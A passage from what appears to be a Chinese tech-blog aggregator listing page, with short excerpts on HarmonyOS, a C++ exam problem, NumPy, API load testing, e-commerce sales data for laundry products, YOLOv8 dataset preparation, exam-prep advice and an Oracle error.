HarmonyOS SDK是鸿蒙原生应用开发的核心引擎，起着至关重要的作用。它通过将关键能力底层化、通用能力全局化，不断进行创新，为开发者提供简单高效的开发环境，释放他们的创造力，共同开创全新的鸿蒙原生应用时代。随着鸿蒙原生应用的广泛发展和三方SDK鸿蒙化的进展，鸿蒙生态正迎来全新的发展阶段。在这个阶段，华为将秉持开放、合作、共赢的理念，与全球的开发者、合作伙伴和消费者紧密合作，共同推动鸿蒙生态的繁荣壮大，创造更加精彩的数字化未来。
HarmonyOS NEXT鸿蒙星河版的发布是华为在操作系统领域的重大突破，展示了华为强大的技术实力和创新能力。据消息人士透露，华为正积极准备推出PC版的鸿蒙系统，届时，华为的全生态全终端系统将正式亮相！它旨在提供卓越的用户体验并构建繁荣的生态系统。随着鸿蒙生态设备的增长和原生应用的丰富，相信在不久的将来，鸿蒙系统将成为全球消费者喜爱的智能操作系统之一。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3962e847f6b24a60a0ae0fddf84f0cee/" rel="bookmark">
			2024年华为OD机试真题-字符串变换最小字符串-（C&#43;&#43;）-OD统一考试（C卷）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述：
给定一个字符串s，最多只能进行一次变换，返回变换后能得到的最小字符串（按照字典序进行比较）。变换规则：交换字符串中任意两个不同位置的字符。
输入描述：一串小写字母组成的字符串s
输出描述：按照要求进行变换得到的最小字符串
补充说明：s是都是小写字符组成
1&lt;=s.length&lt;=1000
示例 示例1
输入：abcdef
输出：abcdef
说明：abcdef已经是最小字符串，不需要交换
示例2
输入：bcdefa
输出：acdefb
说明：a和b进行位置交换，可以等到最小字符串
#include &lt;iostream&gt; #include &lt;string&gt; using namespace std; int main() { int i = 0; string str; cin &gt;&gt; str; int indexmin = -1; int min = INT16_MAX; while (str[i] &lt;= str[i + 1] &amp;&amp; i &lt; str.size() - 1) { ++i; } int j = i + 1; if (j &gt;= str.size()) { cout &lt;&lt; str; return 0; } for (i = j; i &lt; str.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3962e847f6b24a60a0ae0fddf84f0cee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6dd9fa0d0d1cc1436dcc50d083d54c68/" rel="bookmark">
			【C语言】分支循环语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分支 if elseif else if else if elseswitch() case default 循环 while 防止死循环for 已知所需循环次数do while 至少执行一次 break 和continue在循环中的应用
break ：退出当前循环；
continue：推出本次/轮循环
goto 太乱了，不建议使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd3f39cf5bdc91eb340b4d5e56f7202b/" rel="bookmark">
			机器学习 | 深入探索Numpy的高性能计算能力
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
初识numpy
numpy基本操作
数组的基本操作
ndarray运算
数组间运算
矩阵
初识numpy Numpy（Numerical Python）是一个开源的Python科学计算库，用于快速处理任意维度的数组。Numpy支持常见的数组和矩阵操作。对于同样的数值计算任务，使用Numpy比直接使用Python要简洁的多。
Numpy使用ndarray对象来处理多维数组，该对象是一个快速而灵活的大数据容器。它描述了相同类型的“item”的集合。ndarray 对象是在连续的内存块中分配的，因此访问和处理元素的速度比 Python 的原生列表更快，以下是ndarray与原生python在效率上的对比：
import random import time import numpy as np a = [] for i in range(100000000): a.append(random.random()) # 通过%time魔法方法，查看当前行的代码运行一次所花费的时间 %time suml = sum(a) b = np.array(a) %time sum2 = np.sum(b) 机器学习最大的特点就是大量的数据运算，那么没有一个快速的解决方案的话，那可能现在的py也在机器学习领域达不到好的效果。 Numpy专门针对ndarray的操作和运算进行了设计，所以数组的存储效率和输入输出性能远优于Python中的嵌套列表，数组越大，Numpy的优势就越明显。
从下图我们可以看出：ndarray在存储数据的时候，数据与地址都是连续的，这样就使得批量操作数据元素时速度更快，而python原生list就只能通过寻址方式找到下一个元素。
以下是ndarray的常用属性介绍：
属性名字属性解释ndarray.shape数组维度的元组ndarray.ndim数组维度ndarray.size数组中的元素数量ndarray.itemsize一个数组元素的长度(字节)ndarray.dtype数组元素的类型 以下根据表格的情况，进行下面的测试来验证常用属性的使用
numpy基本操作 以下解释使用numpy的一些基本操作：
生成0,1数组：我们也可以通过numpy生成特殊的0,1数组操作：
生成现有数组：通过下面的方式将现有的数组生成ndarray形式：
a = np.array([[1,2,3], [4,5,6]]) # 从现有的数组中创建 a1 = np.array(a) # 相当于索引的形式，并没有真正的创建一个新的 a2 = np.asarray(a) array和asarray的不同在于，array是深拷贝而asarray是浅拷贝，如下：
生成固定范围数组：通过numpy的函数生成一个固定范围的数组
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd3f39cf5bdc91eb340b4d5e56f7202b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f168ac43a8d29478a8e354a68e046640/" rel="bookmark">
			智能AI系统开发，专业软件硬件物联网开发公司，探索未来科技新纪元
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在信息时代，人工智能（AI）、物联网等前沿技术日益受到人们的关注。智能AI系统、专业软件硬件物联网开发公司应运而生。今天，我们将向大家介绍一家位于XX城的专业公司，致力于智能AI系统开发和软件硬件物联网领域的创新研发。让我们一起探索未来科技的新纪元吧！
该公司拥有一支富有经验和创新力的技术团队。他们在人工智能、深度学习、计算机视觉等领域扎根多年，积累了丰富的开发经验和技术专长。凭借对AI技术的深入了解和不断创新的精神，他们成功开发了一系列智能AI系统，包括语音识别、图像识别、自然语言处理等先进功能。这些系统已广泛应用于各个领域，为企业提供了高效智能化的解决方案，助推了产业升级与转型。
作为一家专业软件硬件物联网开发公司，他们不仅在智能AI系统领域有所建树，还致力于物联网领域的创新研发。他们的团队成员广泛涉猎于物联网硬件设计、通信技术、嵌入式系统等相关领域，能够提供端到端的物联网解决方案。无论是智能家居、智慧工厂还是智慧城市，该公司都能为客户量身定制高效可靠的物联网系统，实现设备之间的互联互通，提升生产力和生活品质。
为了更好地满足市场需求，该公司不断提升技术实力和创新能力。他们积极参与国内外技术交流与合作，在高性能计算、人工智能芯片等领域与知名企业建立合作关系。这使得他们可以借鉴世界先进科技的经验和资源，从而提供更加出色的解决方案和服务。
在公司的发展过程中，持续的技术创新是基石。公司注重人才培养和研究投入，鼓励员工积极探索，挑战自我。他们注重项目管理和团队协作，确保项目的高质量和高效率完成。公司还注重知识产权保护，积极申请和使用专利，将自主研发的技术成果转化为核心竞争力。
作为一家专业从事智能AI系统开发、软件硬件物联网开发的公司，该公司致力于推动科技的创新与应用。他们凭借优秀的技术团队、领先的技术实力和不断创新的精神，成为行业的领军者。未来，他们将继续致力于技术研发，推动科技创新，在智能化、自动化等领域实现更多突破和进步。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/792442a07a2651c770dec3e0ac2e8235/" rel="bookmark">
			接口性能测试，这个还真有用啊。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、概述 性能测试按照不同视角，可以分为以下几类：
a. 用户视角的性能
用户角度感受到的网站响应速度的快和慢。从用户在浏览器输入网址/打开应用，到整个页面呈现给用户的耗时。包含了用户端发送请求，服务端收到并执行请求，返回请求，客户端收到之后渲染的总时间。
b.开发人员视角的性能
包括系统吞吐量，并发处理能力，系统稳定性，响应延迟等。如果发现有不满足要求的地方，需要定位出问题所在，并给出解决方案。
c.运维
主要关注基础设施性能和资源利用率，如网络运营商带宽能力，服务器应急配置，数据中心网络架构，服务器和网络带宽的资源利用率等。
二、为什么要做接口压力测试 1.清楚自己所提供的接口性能是多少
2.判断出系统可能存在的问题（代码，DB，cache，系统配置,容量等），提前解决
3.为设置接口的限流/熔断做参考
三、接口压力测试的局限性 接口压力测试只注重单业务的接口性能，进行压测的时候，只关注个别接口的性能。
接口大部分时间是在线下进行，可能线上线下机器配置不一样，而且线上同时在进行着各种不同的业务。
因此在线下进行接口压力测试的结果，只能作为线上配置的一个参考值。
四、谁来做接口压力测试 对接口比较熟悉的开发人员来做，这样有以下好处：
1.对接口实现比较了解，对接口中潜在的问题有一定的预判
2.比较容易对接口进行优化（业务逻辑层面和技术层面）。
五、如何做接口压力测试 通常使用 Jmeter ，loadRunner 等进行压力测试。
六、如何设计接口压力测试方案 如何确定并发数：
可以通过尝试的方式。第一次压测的时候，可以设置自己预期接口需要达到的并发数，进行压力测试。然后通过二分法进行调整。
举例：如果期望的并发数是512 ，第一次压测并发数设置为512 ，如果系统没有压力，第二次并发就尝试设置为1024。如果系统有压力，下次就设置为256。通过逐渐尝试的方式，找出当前接口的并发阈值。
如何确定总请求次数：
有时候单纯的通过并发数并不能完全发现系统的压力状况，因为并发数只能测出系统的处理能力。
但是有时随着长时间的调用，系统可能会出现其他问题。比如：随着数据量的增多，存储磁盘满了、内存缓存用光，缓存服务使用磁盘缓存而拖慢系统等情况。
为了避免这种情况，可以尝试用现有线上业务每天产生的数量乘以一定的天数（天数的大小视业务的具体情况而定，推荐180天以上），作为接口压力测试的总请求次数。
接口压力测试数据的选取：
通常随机选择数据。但是要注意重复进行压力测试对性能的影响。
比如：
第一次压测的 Id 是从2500W 到2600W 之间选择的，下次用同样的 Id 范围做压测的时候，如果接口实现中有缓存，则会很大程度影响压力测试的结果，对压力测试的解读时候，要考虑到这个因素。
另外，使用不存在的 Id 去进行压测，结果并没有太大意义。
七、压力测试报告应该包含哪些结果 接口压力测试结果
服务器压力
每次接口压力测试时，接口所在服务的服务器 cpu/jvm 使用率历史记录，jvm堆大小，响应时长图 （借助 pinpoint 查看），cpu load 值（top 命令），gc 信息等。
八、如何解读压力测试的结果 对于接口压力测试结果：
关注 响应时间是否符合要求，响应时间（前99%） 是不是在可允许的范围内。最大值是多少，是否可以容忍。 通常来说，错误百分比应该为0。
对于服务器压力：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/792442a07a2651c770dec3e0ac2e8235/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cba28e114e71b448ee238d270165868b/" rel="bookmark">
			2023年衣物清洁赛道行业数据分析（电商数据查询）：总销额同比下滑21%
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		衣物清洁产品是日常生活中的必备消费品，加之消费频次较高，因此在我国较大的人口基数背景下，衣物清洁市场的整体体量也比较大。不过，从年度的销售走势看，2023年衣物清洁市场的整体销售呈现一定幅度的下滑。
根据鲸参谋电商数据分析平台的相关数据显示，2023年京东平台上衣物清洁市场的总销量为1.4亿+，同比下滑约14%；市场总销额将近72亿，同比下滑约21%。
从细分市场来看，随着消费者的消费逐渐呈多元化、个性化及精致化方向发展，衣物清洁市场中一些助力人们精致生活的新兴细分品类日益增多，并受到消费市场的热捧，如内衣洗衣液、真丝羊毛洗衣液、去渍笔、吸色片等。
从数据来看，这些品类在行业大盘下滑的情况下，仍表现出较好的增势，下面我们具体来看这些增长类目的大盘销售表现。
*内衣洗衣液
从消费者的个性化需求来看，除了一般的衣物清洁需求外，特定人群的清洁需求也逐渐显现，如女性内衣清洁。更多的女性消费者对贴身衣物有着更高的清洗要求且习惯手洗，在这一消费需求的推动下，内衣洗衣液市场的规模也不断扩大。
鲸参谋数据显示，2023年度，京东平台上内衣洗衣液市场的销量为940万+，同比增长约61%；年度销售额为3.5亿+，同比增长约74%。
从品牌角度来看，内衣洗衣液市场中市占较高的两大品牌分别为威露士和蓝月亮。威露士品牌的年销量为200万+，年销额为6400万+，市场占比在18%左右；蓝月亮品牌的年销量为130万+，年销额约5300万，市占约15%。
此外，在内衣洗衣液的热销TOP10品牌榜单中，上榜的品牌还有立白、妇炎洁、超能、小林制药、植护、好爸爸、奥妙、绽家，这些品牌在市场中的占比均在4%-7%之间。
*真丝羊毛洗衣液
从产品品类来看，衣物清洁在市场的细分上逐渐延伸出针对不同类型织物的清洁产品，如真丝、羊毛等特殊面料在洗涤中容易出现拉丝、皱褶、质感变硬、性能下降等问题，需要额外呵护。因此，特定的真丝羊毛洗衣液也被推出以针对性地解决特殊面料的洗涤问题。
从销售数据来看，真丝羊毛洗衣液的受欢迎程度较高，市场增长也较为迅猛。鲸参谋数据显示，2023年度，京东平台上真丝羊毛洗衣液的年度销量约75万，同比增长约212%；年度销售额为3590万，同比增长约327%。
在真丝羊毛洗衣液市场中，市场占比超过10%的品牌有正章、花王、ONEFULL和蓝月亮，市占分别约16%、14%、11%和10%，其中，正章和花王两品牌的年销额均在500万以上。此外，Frosch、vilosi和The Laundress等品牌的市占也在5%以上。
*去渍笔
去渍笔更具便携性，能够比较及时地去除日常生活中的各类污渍，因而也受到广大消费者的青睐。鲸参谋数据显示，2023年度，京东平台上去渍笔的年销量约为14万，同比增长约289%；年销售额为380万+，同比增长约513%。
去渍笔市场的品牌集中度较高，市场中热销排名前二的品牌分别为狮王和超能，两品牌的市占合计约93%。其中，狮王去渍笔的年销额约247万，市占约65%；超能去渍笔的年销额在105万左右，占比将近28%。
*吸色片
如今，吸色片不仅能够解决衣物串色的问题，同时，不少吸色片还有消毒杀菌和留香的作用，这也吸引了不少消费者争相购买，市场整体销售呈现增长。
鲸参谋数据显示，2023年度，京东平台上吸色片市场的销量约为24万，同比增长约182%；年度销售额约565万，同比增长约81%。
从品牌角度看，kinbata和泉立方是吸色片市场中排名靠前的两大热销品牌。kinbata品牌在热榜中排名第一，该品牌的年销额超过140万，市场占比在25%左右；泉立方品牌的年销额为58万+，市场占比在10%左右。
此外，超能、JINYIHOUSE、奥妙和植护等也是吸色片市场中的热销品牌，品牌市占均在5%以上。
鲸参谋数据来源于公开渠道，数据获取与统计可能存在不完整，仅供参考。
如想查看京东平台其他品类2023全年度的数据或往年历史数据，欢迎搜索“鲸参谋电商数据”，或者直接评论留言和私信（也可接口对接）~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/403afd34e54d7990b5441e4cd7e4010a/" rel="bookmark">
			YOLOv8训练自己的数据集,通过LabelImg
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录下labelImg标注数据到YOLOv8训练的过程,其中容易遇到labelImg的坑
数据集处理 首先在mydata下创建4个文件夹 images文件夹下存放着所有的图片，包括训练集和测试集等。后续会根据代码进行划分。
json文件夹里存放的是labelImg标注的所有数据。需要注意的是，json文件的命名应与images文件夹中的图片一一对应。labels文件夹是空的，后续会根据代码将json转化为YOLOv8支持的训练数据集。接下来需要创建一个 split_train_val.py 文件，放在mydata目录下，用于将images文件夹中的图片划分为训练集和测试集。代码如下：
import os import json import random import argparse class DatasetSplitter: def __init__(self, json_path, txt_path): self.json_path = json_path self.txt_path = txt_path self.trainval_percent = 1.0 self.train_percent = 0.9 self.total_json = os.listdir(json_path) self.num = len(self.total_json) self.list_index = list(range(self.num)) if not os.path.exists(txt_path): os.makedirs(txt_path) def split_dataset(self): tv = int(self.num * self.trainval_percent) tr = int(tv * self.train_percent) trainval = random.sample(self.list_index, tv) train = random.sample(trainval, tr) file_trainval = open(os.path.join(self.txt_path, 'trainval.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/403afd34e54d7990b5441e4cd7e4010a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1840e48b4f7551cf003b4dda5a449f77/" rel="bookmark">
			软考培训机构哪家比较好？各软考培训机构排名如何？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先放上机构测评图
一、机构情况
（1）主营业务
大多数软考培训机构主要致力于IT培训或者软件行业。这些机构的课程更加专业，因为他们起源于该行业。我相信报考软考的同学大部分也是从事这个行业的。个人认为选择这类机构进行培训会有更多好处，因为它们能够提供更多与实战应用和职业发展相关的内容。
（2）办学历史
机构的办学历史越久，通常代表着丰富的经验积累，同时也反映了其市场竞争力和长久存活的能力。因此，机构的办学历史在一定程度上可以体现其实力的强弱。老牌机构往往给人一种靠谱的感觉，但这只能作为参考因素。尽管老机构的价格相对较高，但近年来出现了许多新机构，依靠创新的教学方式和实惠的价格，迅速占领了市场份额。总的来说，超过10年运营的正规机构是值得放心选择的。
（3）师资力量
老师的优秀与否对于培训效果的影响非常重要。当一个课程由名师讲授时，可以帮助学生以最少的时间和精力获得最高的分数，并且更加轻松地通过考试取得证书。
（4）通过率
通过率是衡量考试成功率的重要指标，它直接影响着你在报班后能否成功获得证书的概率。就整体而言，国内软考考试的通过率大约为中级20-30%，高级20%左右。值得一提的是，自学的通过率通常相对于参加培训班的学员较低。参加培训班相当于额外购买了一份保障，对于那些希望尽快获证、自学能力稍差、希望一次性通过的同学来说，建议关注这个指标。
二、课程情况
（1）价格
针对软考方面的培训价格，大多数同学都会将其视为首要考虑的因素。不过令人奇怪的是，相同的线上培训方案，其价格差异却非常大。低价课程甚至可能不到2000元，而高价课程则可能达到4000元以上。考虑到这笔费用对于大部分考生来说都是一笔相当可观的支出，我建议大家在选择培训时要慎重考虑自己的财务能力。
（2）授课科目
为了评估软考机构的教学水平和整体实力，我们引入了一个重要的测评项目——授课科目数量。根据这个指标，授课科目越多的机构往往代表着更高的教务水平和更强大的实力。这项测评项目的添加不仅可以作为评价机构的重要指标，而且还能帮助考生们快速找到适合自己报考科目的机构，为他们节省备考时间。这样，考生们就可以更加高效地进行复习备考工作了。
（3）线下班地点
为何要将线下班作为一项独立的评估指标呢？这是因为线下班可以作为评估机构实力的一项重要元素。线下班注重教师的现场教学和互动方式，更考验教师的教学水平和应变能力。然而，线下班只能从侧面反映机构的实力，并且由于近两年的疫情原因，鼓励线上教学，反而不推荐报名线下班，因此对线下班的权重设置相对较低。
（4）学习资料
大部分培训机构都会供应一些学习材料。学习资料的数量与质量，以及是否有相应的讲义，对我们的学习效率和学习质量有重要的影响。最理想的情况是能够提供完整的一整套学习资料，其中包括教材、辅导书、讲义和模拟题。在这些资料中，模拟题最好是培训机构自己研发的，并且具有较高的往年考试成功率。
（5）习题情况
题目是加强知识的最佳辅助工具之一，而题目的质量对于复习的效果有着重要的影响。首要的一步是要确保所用的题库是最新版本且与实际考试内容相符。其次，确定题库的题目数量，因为越多越好。如果在考试前能够完成上万道题目的刷题，并且保持高且稳定的正确率，那么通过考试的几率就会大大提高。
（6）课程有效期
课程有效期指的是如果考试未能通过，学生可以在规定的时间内免费继续上课，直到通过考试为止。尽管我们都希望能够一次性通过考试，但是万一不能如愿，我们可能需要重新付费参加培训并参加补考。这种情况下，非常重要的是注意课程的有效期。这样可以确保学生有足够的时间来准备并通过考试，避免因考试未通过而产生额外的费用和时间浪费。
（7）上课方式
针对线上班，一般有三种上课方式可供选择：在线直播并且支持互动，在线直播但无法进行互动，以及仅提供回放视频。根据我的经验，我强烈建议选择支持互动的在线直播方式，因为这样可以便捷地与老师进行提问和交流，从而获得更好的学习效果。互动交流有助于解决疑问、深化理解，并能促进学习的互动性和参与度。通过在线直播的互动环节，学生能够积极参与课堂活动，与教师和同学进行交流和讨论，进一步增强学习的效果和体验。
（8）上课时间
上课时间就是线上直播的时间，每家机构都不一样，有工作日晚上的，有周末晚上的，也有周末全天上课的，这个可以结合自己的实际情况挑选适合自己的
三、其他服务
（1）答疑服务
答疑是指在学习过程中遇到问题时寻求咨询和解答的行为。一般情况下，学习机构会安排专门的辅导老师或授课老师来进行答疑服务。从学生的角度来看，授课老师进行答疑能够提供更好的效果，因为这样能够与直播课内容进行有机的互动，进一步确保学习的连贯性。
（2）客服态度
所谓的客服是指在咨询报班过程中协助的服务人员，尽管客服的态度与正规上课并无直接联系，但客服作为一个公司的形象代表起着重要的角色。如果在咨询课程时，这位客服表现得冷漠、甚至使用了一些不礼貌的用语，那很有可能这家机构对待服务并不重视。对于这样的机构，我们应该保持谨慎。
四、学习方法介绍
1、复习时间安排
软考考试时间为2023年5月27日。准备时间上，对于中级考生来说，建议从四月初开始准备，如果基础较好，四月中下旬也可以开始准备，但五月稍有压力。对于高级考生来说，建议从三月初开始准备。报名后，建议按照课程计划有序地进行学习，不要拖延，这个时间安排因人而异。总体而言，三个月的准备时间是相对充裕的。
2、复习步骤和具体方法
学习阶段规划如下：
第一阶段：刷视频和记忆过程表格
整理47个过程表格，并在第一章刷视频前记住这47个过程。
在刷视频课程时，选择1.5倍速播放，同时划重点。
刷完视频后，进行一套真题练习，重点是了解出题方式，有助于后续阅读书籍时的知识梳理和理解。
第二阶段：细致阅读书籍和记录笔记
每读完一章节后，整理该章节的笔记，简洁明了即可，不必过于繁复，以节省时间。
完成一章节的阅读后，做完相应章节的课后题，如果有附带的章节习题更好。
在阅读书籍的同时，整理相关论文素材，特别是十大知识领域的素材。
阅读书籍分为三个部分：第一部分是关于信息化和信息系统的内容，第二部分是关于十大知识领域的内容，第三部分是其他内容的汇总。
在阅读第二部分内容时，要梳理十大知识领域的输入输出和工具技术，并理清它们之间的逻辑关系。
第一和第二部分是非常重要的部分。
第三阶段：刷题和备考论文
对于选择题的刷题，要认真分析错误和猜对的题目，思考错误的原因和解题方法。
对于案例题，要熟悉计算和分析答题方法。
如果有充足的时间，要准备多篇论文并备背，确保不出差错。
对于每个人的学习情况，可能会因为工作或刚毕业而有所不同，可以根据自身情况进行学习规划和调整。
第四阶段：考试答题技巧和知识点总结分享
在考试的最后冲刺阶段，重点是要集中精力抓住核心考点。这些考点主要包括需求、变更、进度、成本、质量、人力资源和沟通等章节。建议大家要熟练掌握这些知识点，因为案例分析通常会集中在这些方面。在备考过程中，特别需要重点关注这些章节，掌握其中的重要概念和方法。这样才能更好地应对考试中与这些核心知识相关的问题。希望大家能够充分准备，考试顺利！
除了掌握基本的理论知识点，我们在解答问题时还应注意一些答题技巧，这些技巧能够在案例分析中提高5~10分。以下是一些建议，希望大家尽量掌握：
1）回答问题时，要简练表达，避免长篇大论。适中的答案长度是最佳选择。
2）过程要清晰，特别是在涉及公式计算时，写出详细的步骤。即使结果不正确，也能得到过程分。
3）文字清晰、书写工整。这样能给老师留下良好的印象。
4）考试时，有时记不太清楚答案，脑子里有几个可能的答案。建议将这些答案都写上，因为多写不会扣分。
5）答题要有条理。阅卷老师需要批改成千上万份试卷，如果回答没有条理，可能会草率批改。因此，建议大家在回答问题时要有组织有条理，最好使用分列的方式，例如1、2、3、4、5等等。
6）尽量使用专业术语，避免使用口语化的表达。引用案例，紧密联系知识点。
7）遇到不会的问题，千万不要放弃。因为案例的评分标准是答到点子上就有分的！即使不会写，也要尽量写点相关的内容，并且向着相关的知识点靠拢。需要注意的是，多写一些与标准答案不重复且没有明显错误的内容是不会影响得分的。所以在回答问题时，尽量多写一些。同时，尽量往理论知识上靠拢，这点非常重要。（即使不会写，也要写一些东西，不写肯定没有分，写了肯定有分，得分多少则取决于内容的质量）
希望以上建议能对大家有所帮助。加油哦！
备考资料分享如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4bdc955ae71cf127862fd8c20cca4bb/" rel="bookmark">
			自动化专业C语言和Python推荐学哪个?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自动化专业C语言和Python推荐学哪个? 在开始前我分享下我的经历，刚入行时遇到一个好公司和师父，给了我机会，两年时间从3k薪资涨到18k的，
我师父给了一些【C语言 &amp;nbsp;】学习方法和资料，让我不断提升自己，感谢帮助过我的人，
如大家和我一样需要我可以分享资料在评论区扣888或私我888
作为一名自动化专业出身的软件从业者，我也经历过和你一样的迷茫期。
如今，我从过来人的角度告诉你编程是自动化专业学生必需学好的一门技能。无论你以后是考研还是工作，编程都是必备技能。编程犹如练剑，计算机基础知识犹如剑法，编程语言就是剑，只要你掌握了剑法，使用什么样的剑都能杀敌于无形。
而编程的剑法就是计算机四大件：操作系统、数据结构与算法、计算机体系结构、计算机网络。
编程五大件虽然是计算机专业的基础课，但是自动化专业也会学习，只是考核要求不像计算机专业那么高。课堂上学完这些课程只是有个印象，要想深入学习还得花时间自学，自学教材建议采用国外的经典教材，国内高校都喜欢自己造轮子，水平不够，字数来凑。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d81c4e2a5523693881948a302ad88238/" rel="bookmark">
			纯血鸿蒙（HarmonyOS3.1）入门教程 未完待续......
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、序 1.1 鸿蒙系统的崭新时代 https://blog.csdn.net/zy0412326/article/details/134918536
1.2 鸿蒙开发语言选择 鸿蒙HarmonyOS开发用什么语言_harmonyos 放弃 java-CSDN博客
1.3 鸿蒙开发环境IDE配置 DevEco Studio 3.1IDE环境配置（HarmonyOS 3.1）_deveco studio3.1怎么配置环境-CSDN博客
1.4 项目结构 DevEco Studio 鸿蒙（HarmonyOS）项目结构_鸿蒙 gitignore-CSDN博客
1.5 生成HPK文件 DevEco Studio 生成HPK文件-CSDN博客
1.6 第一个程序 DevEco Studio 创建第一个鸿蒙（HarmonyOS）程序-CSDN博客
1.7 项目启动和Device Manage DevEco Studio 项目启动工程和Device Manage_devecostudio怎么运行项目-CSDN博客
1.8 资源引用（自定统和系统）DevEco Studio 项目鸿蒙（HarmonyOS）资源引用（自定统和系统）_鸿蒙获取系统自带资源-CSDN博客
1.9 DevEco Studio 项目鸿蒙（HarmonyOS）多语言-CSDN博客多语言 DevEco Studio 项目鸿蒙（HarmonyOS）多语言-CSDN博客 1.10 更改应用名称 鸿蒙（HarmonyOS）项目方舟框架（ArkUI）更改应用名称-CSDN博客
1.11 更改应用图标 鸿蒙（HarmonyOS）项目方舟框架（ArkUI）更改应用图标_鸿蒙iconfont-CSDN博客 1.12 开发环境汉化 鸿蒙（HarmonyOS 3.1） DevEco Studio 3.1开发环境汉化-CSDN博客 二、方舟框架 2.1通用属性和事件 2.1.1 控件的部分公共属性和事件鸿蒙（HarmonyOS）项目方舟框架（ArkUI）控件的部分公共属性和事件_deveco3.1 onclick事件-CSDN博客
2.2基础组件 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d81c4e2a5523693881948a302ad88238/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b76ec61892a33cd109c267b0bd5f6fa9/" rel="bookmark">
			python毕设选题 - 机器学习新闻算法实现 - python机器学习 深度学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 0 前言简介本文章博主将介绍: 参与及比较算法先说结论实现过程数据爬取数据预处理 CNN文本分类其他分类方法更新中....... 最后 0 前言 🔥 这两年开始毕业设计和毕业答辩的要求和难度不断提升，传统的毕设题目缺少创新和亮点，往往达不到毕业答辩的要求，这两年不断有学弟学妹告诉学长自己做的项目系统达不到老师的要求。
为了大家能够顺利以及最少的精力通过毕设，学长分享优质毕业设计项目，今天要分享的是
🚩 机器学习新闻算法实现
🥇学长这里给一个题目综合评分(每项满分5分)
难度系数：3分工作量：3分创新点：3分 简介 新闻分类课题是在算法类毕业设计中比较热门的, 本质上是属于自然语言分类, 可以使用机器学习算法去处理, 也可以使用深度学习算法去处理.
基本步骤如下 :
文本数据采集 --&gt; 选择训练算法(机器学习/深度学习) --&gt; 进行训练 --&gt; 检效果.
本文章博主将介绍: 从头开始实践中文短文本分类运用多种机器学习（深度学习 + 传统机器学习）方法比较短文本分类处理过程与结果差别 参与及比较算法 使用下面的算法来进行文本分类, 并对最后分类准确率进行比较
CNN 、 CNN + word2vecLSTM 、 LSTM + word2vecMLP（多层感知机）朴素贝叶斯KNNSVMSVM + word2vec 、SVM + doc2vec 先说结论 引入预训练的 word2vec 模型会给训练带来好处，具体来说：（1）间接引入外部训练数据，防止过拟合；（2）减少需要训练的参数个数，提高训练效率LSTM 需要训练的参数个数远小于 CNN，但训练时间大于 CNN。CNN 在分类问题的表现上一直很好，无论是图像还是文本；而想让 LSTM 优势得到发挥，首先让训练数据量得到保证将单词在 word2vec 中的词向量加和求平均获得整个句子的语义向量的方法看似 naive 有时真挺奏效，当然仅限于短句子，长度 100 以内应该问题不大机器学习方法万千，具体选择用什么样的方法还是要取决于数据集的规模以及问题本身的复杂度，对于复杂程度一般的问题，看似简单的方法有可能是坠吼地 实现过程 数据爬取 爬虫这里不公开提供, 爬取的是各大新闻网站数据, 需要的联系博主获取, 联系方式在文章最下方~
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b76ec61892a33cd109c267b0bd5f6fa9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d1298c10c206f19f961bc0cc98942cf/" rel="bookmark">
			75.导入报错:ORA-31644: 无法定位块编号 549045
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.导入报错:ORA-31644: 无法定位块编号 549045
